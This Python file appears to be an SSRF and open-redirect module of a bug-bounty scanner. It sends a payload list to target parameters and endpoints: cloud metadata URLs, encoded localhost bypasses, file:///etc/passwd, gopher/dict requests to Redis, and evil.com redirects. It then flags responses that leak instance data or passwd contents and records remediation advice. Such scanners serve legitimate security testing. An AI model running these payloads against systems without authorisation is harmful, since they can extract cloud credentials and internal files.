#!/usr/bin/env python3
"""SSRF Scanner - Server-Side Request Forgery detection"""
import requests
import time
import socket
from urllib.parse import urlparse

class SSRFScanner:
    def __init__(self, target, scan_id, socketio, log_fn, finding_fn):
        self.target = target.rstrip('/')
        self.scan_id = scan_id
        self.log = log_fn
        self.add_finding = finding_fn
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 BugHunterPro/2.0'})
        
        # SSRF Test URLs (11 bypass techniques)
        self.ssrf_payloads = [
            # Cloud metadata
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/v1/',   # DigitalOcean
            'http://100.100.100.200/latest/meta-data/',  # Alibaba
            # Internal
            'http://localhost/',
            'http://127.0.0.1/',
            'http://0.0.0.0/',
            # SSRF Bypass
            'http://[::1]/',
            'http://0177.0.0.1/',   # Octal
            'http://2130706433/',   # Decimal IP for 127.0.0.1
            'http://0x7f000001/',   # Hex
            'http://127.1/',
            'http://127.0.1/',
            # Protocol abuse
            'file:///etc/passwd',
            'dict://localhost:6379/info',
            'gopher://localhost:6379/_INFO',
            'ftp://localhost/etc/passwd',
            # DNS rebinding
            'http://1u.ms/127.0.0.1/',
        ]

    def run(self):
        self.log(self.scan_id, "🌐 Testing SSRF vulnerabilities...", 'info', 'ssrf')
        
        # Find URL/URI parameters
        url_params = self._find_url_params()
        
        # Test open redirect + SSRF chain
        self._test_open_redirect()
        
        # Test URL parameters
        for param_info in url_params:
            self._test_param_ssrf(param_info)
        
        # Test common SSRF endpoints
        self._test_common_endpoints()
        
        # Test SSRF via file upload
        self._test_upload_ssrf()
        
        self.log(self.scan_id, "  ✅ SSRF scan complete", 'info', 'ssrf')

    def _find_url_params(self):
        self.log(self.scan_id, "  🔍 Finding URL/URI parameters...", 'info', 'ssrf')
        url_params = []
        
        # Common parameters that often handle URLs
        url_param_names = [
            'url', 'uri', 'path', 'file', 'page', 'redirect',
            'next', 'return', 'callback', 'host', 'domain',
            'src', 'source', 'dest', 'destination', 'location',
            'proxy', 'fetch', 'load', 'link', 'href',
            'webhook', 'endpoint', 'api_url', 'image_url', 'avatar_url'
        ]
        
        try:
            r = self.session.get(self.target, timeout=8)
            import re
            # Find params in forms and URLs
            urls = re.findall(r'["\']([^"\']*\?[^"\']+)["\']', r.text)
            for url in urls[:20]:
                from urllib.parse import urlparse, parse_qs
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params:
                    if any(kw in param.lower() for kw in url_param_names):
                        url_params.append({
                            'url': self.target + parsed.path if not url.startswith('http') else url,
                            'param': param,
                            'original_value': params[param][0]
                        })
                        self.log(self.scan_id, f"  📌 URL param found: {param}", 'data', 'ssrf')
        except:
            pass
        
        # Also add commonly known SSRF-prone endpoints
        common_ssrf_endpoints = [
            {'url': f'{self.target}/api/fetch', 'param': 'url', 'original_value': 'https://example.com'},
            {'url': f'{self.target}/api/proxy', 'param': 'url', 'original_value': 'https://example.com'},
            {'url': f'{self.target}/api/webhook', 'param': 'url', 'original_value': 'https://example.com'},
            {'url': f'{self.target}/api/screenshot', 'param': 'url', 'original_value': 'https://example.com'},
            {'url': f'{self.target}/api/pdf', 'param': 'url', 'original_value': 'https://example.com'},
            {'url': f'{self.target}/api/avatar', 'param': 'url', 'original_value': 'https://example.com'},
        ]
        url_params.extend(common_ssrf_endpoints)
        
        return url_params

    def _test_param_ssrf(self, param_info):
        url = param_info['url']
        param = param_info['param']
        
        for payload in self.ssrf_payloads[:8]:
            try:
                test_url = f"{url}?{param}={requests.utils.quote(payload)}"
                r = self.session.get(test_url, timeout=6)
                
                # Check for cloud metadata leakage
                body = r.text.lower()
                if any(indicator in body for indicator in [
                    'ami-id', 'instance-id', 'hostname', 'local-ipv4',
                    'root:x:', 'etc/passwd', 'metadata/latest',
                    'google.internal', 'computeMetadata'
                ]):
                    self.log(self.scan_id, 
                        f"  🚨 SSRF CONFIRMED: {param}={payload[:40]}", 'critical', 'ssrf')
                    self.add_finding(self.scan_id, {
                        'type': 'Server-Side Request Forgery (SSRF)',
                        'severity': 'critical',
                        'target': url,
                        'parameter': param,
                        'description': f'SSRF vulnerability detected in parameter "{param}"',
                        'evidence': f'Payload: {payload}\nResponse contains cloud metadata/internal data:\n{r.text[:500]}',
                        'cvss': 9.8,
                        'poc': f'curl -s "{test_url}"',
                        'remediation': 'Use allowlist of permitted URLs. Block access to internal network ranges. Use IMDS v2 with session tokens.',
                        'cwe': 'CWE-918'
                    })
                    return
                    
            except:
                pass

    def _test_open_redirect(self):
        self.log(self.scan_id, "  ↩️ Testing open redirect...", 'info', 'ssrf')
        
        redirect_params = ['redirect', 'next', 'return', 'returnUrl', 'goto', 'url', 'continue']
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'https://evil.com%23',
            'https://evil.com?next=' + self.target,
            'https://evil.com@' + urlparse(self.target).netloc,
        ]
        
        for param in redirect_params:
            for payload in redirect_payloads[:3]:
                try:
                    url = f"{self.target}?{param}={requests.utils.quote(payload)}"
                    r = self.session.get(url, timeout=4, allow_redirects=False)
                    
                    if r.status_code in [301, 302, 303, 307, 308]:
                        location = r.headers.get('Location', '')
                        if 'evil.com' in location or payload in location:
                            self.add_finding(self.scan_id, {
                                'type': 'Open Redirect',
                                'severity': 'medium',
                                'target': url,
                                'description': f'Open redirect via {param} parameter',
                                'evidence': f'Redirect to: {location}\nPayload: {payload}',
                                'cvss': 5.4,
                                'poc': f'curl -I "{url}"',
                                'remediation': 'Validate redirect URLs against an allowlist of permitted destinations.',
                                'cwe': 'CWE-601'
                            })
                except:
                    pass

    def _test_common_endpoints(self):
        self.log(self.scan_id, "  🎯 Testing SSRF-prone endpoints...", 'info', 'ssrf')
        
        endpoints = [
            ('/api/fetch?url=', self.ssrf_payloads[0]),
            ('/api/proxy?url=', self.ssrf_payloads[5]),
            ('/webhook?callback=', self.ssrf_payloads[5]),
        ]
        
        for endpoint, payload in endpoints:
            try:
                url = self.target + endpoint + requests.utils.quote(payload)
                r = self.session.get(url, timeout=5)
                if r.status_code == 200 and len(r.content) > 100:
                    self.log(self.scan_id, f"  ⚠️ SSRF endpoint responds: {endpoint}", 'warning', 'ssrf')
            except:
                pass

    def _test_upload_ssrf(self):
        self.log(self.scan_id, "  📤 Testing URL-based upload SSRF...", 'info', 'ssrf')
        
        # Test if file upload accepts URLs
        upload_endpoints = [
            '/api/upload', '/api/import', '/api/avatar', 
            '/upload', '/import', '/fetch-image'
        ]
        
        for endpoint in upload_endpoints:
            try:
                # Try JSON body with URL
                r = self.session.post(
                    self.target + endpoint,
                    json={'url': 'http://169.254.169.254/latest/meta-data/'},
                    timeout=5
                )
                if r.status_code in [200, 201, 202]:
                    self.log(self.scan_id, 
                        f"  ⚠️ Upload endpoint accepts JSON: {endpoint}", 'warning', 'ssrf')
            except:
                pass
